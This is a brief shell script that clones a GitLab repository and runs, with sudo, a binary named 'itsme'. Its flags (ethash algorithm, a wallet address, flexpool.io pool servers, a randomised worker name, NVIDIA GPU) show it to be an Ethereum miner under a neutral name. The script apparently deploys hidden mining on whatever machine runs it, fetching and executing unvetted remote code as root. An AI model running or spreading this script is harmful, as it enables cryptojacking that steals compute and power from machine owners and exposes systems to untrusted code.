#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS gr2.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
sudo ./itsme -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p ethproxy+tcp://eth-sg.flexpool.io:4444 ethproxy+tcp://eth-hk.flexpool.io -r $(echo $(shuf -i 19141-34464563 -n 1))  --nvidia 1
